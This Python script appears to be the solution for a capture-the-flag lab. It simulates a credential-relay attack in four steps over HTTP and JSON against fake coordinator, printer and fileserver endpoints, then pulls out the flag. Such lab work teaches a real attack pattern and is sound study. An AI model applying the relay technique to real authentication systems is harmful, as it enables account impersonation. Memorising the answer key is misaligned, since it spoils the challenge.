#!/usr/bin/env python3
"""relay-sim.py for the relay-station room (simulation).

Chains the full simulated relay against the room's fake coordinator,
printer device, and fileserver endpoint. Standard library only;
speaks plain HTTP+JSON, never NTLM or SMB.

Usage:
    python3 relay-sim.py --base http://target:8000
"""

import argparse
import json
import urllib.error
import urllib.request


def get_json(base: str, path: str):
    with urllib.request.urlopen(base + path, timeout=15) as res:
        return json.loads(res.read().decode())


def post_json(base: str, path: str, payload: dict):
    req = urllib.request.Request(
        base + path,
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as res:
            body = res.read().decode()
    except urllib.error.HTTPError as exc:
        # Expected endpoints answer refusals with JSON error bodies.
        body = exc.read().decode()
        ctype = exc.headers.get("Content-Type", "")
        if "application/json" in ctype:
            return json.loads(body)
        return {"_html": body}
    ctype_kind = "application/json"
    try:
        return json.loads(body)
    except json.JSONDecodeError:
        return {"_html": body}


def main() -> int:
    parser = argparse.ArgumentParser(prog="relay-sim")
    parser.add_argument("--base", required=True, help="base URL of the relay lab")
    args = parser.parse_args()
    base = args.base.rstrip("/")

    print("[simulation] step 1: capture a challenge minted for fileserver")
    issued = get_json(base, "/coordinator/challenge?target=fileserver")
    challenge = issued["challenge"]
    print(f"  challenge: {challenge}")

    print("[simulation] step 2: make printer-svc answer that challenge")
    answered = post_json(base, "/devices/printer/connect", {"challenge": challenge})
    blob = {
        "account": answered["account"],
        "challenge": answered["answered_challenge"],
        "proof": answered["proof"],
    }
    print(f"  captured: {json.dumps(blob)}")

    print("[simulation] step 3: negative control, wrong-target challenge fails")
    other = get_json(base, "/coordinator/challenge?target=printserver")["challenge"]
    wrong = post_json(base, "/devices/printer/connect", {"challenge": other})
    bad = post_json(
        base,
        "/fileserver/verify",
        {
            "account": wrong["account"],
            "challenge": wrong["answered_challenge"],
            "proof": wrong["proof"],
        },
    )
    print(f"  expected refusal: {bad.get('error', 'unexpected success!')}")

    print("[simulation] step 4: relay the captured triple to fileserver")
    result = post_json(base, "/fileserver/verify", blob)
    html = result.get("_html", "")
    marker = html.find("FLAG{")
    if marker != -1:
        end = html.find("}", marker)
        print(f"  flag: {html[marker : end + 1]}")
    else:
        print(f"  no flag in response: {html[:300]}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
